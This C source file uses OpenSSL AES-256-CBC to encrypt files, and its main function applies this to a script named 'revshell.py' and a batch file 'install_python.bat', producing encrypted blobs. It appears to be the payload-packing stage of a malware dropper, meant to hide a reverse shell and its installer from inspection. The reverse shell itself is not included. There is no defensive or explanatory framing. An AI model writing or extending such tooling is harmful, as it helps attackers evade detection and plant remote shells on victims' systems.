#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void encrypt_aes(const char *input_file, const char *output_file, const char *key_file, const char *iv_file) {
    FILE *input_fp = fopen(input_file, "rb");
    FILE *output_fp = fopen(output_file, "wb");
    FILE *key_fp = fopen(key_file, "rb");
    FILE *iv_fp = fopen(iv_file, "rb");
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    unsigned char buffer[1024];
    unsigned char ciphertext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, ciphertext_len;

    if (!input_fp || !output_fp || !key_fp || !iv_fp) {
        perror("Unable to open files");
        exit(EXIT_FAILURE);
    }

    fread(aes_key, 1, sizeof(aes_key), key_fp);
    fread(aes_iv, 1, sizeof(aes_iv), iv_fp);

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    while ((len = fread(buffer, 1, sizeof(buffer), input_fp)) > 0) {
        EVP_EncryptUpdate(ctx, ciphertext, &ciphertext_len, buffer, len);
        fwrite(ciphertext, 1, ciphertext_len, output_fp);
    }

    EVP_EncryptFinal_ex(ctx, ciphertext, &ciphertext_len);
    fwrite(ciphertext, 1, ciphertext_len, output_fp);

    EVP_CIPHER_CTX_free(ctx);
    fclose(input_fp);
    fclose(output_fp);
    fclose(key_fp);
    fclose(iv_fp);
}

int main() {
    encrypt_aes("revshell.py", "encrypted_revshell.bin", "aes_key.bin", "aes_iv.bin");
    encrypt_aes("install_python.bat", "encrypted_python_installer.bin", "aes_key.bin", "aes_iv.bin");
    return 0;
}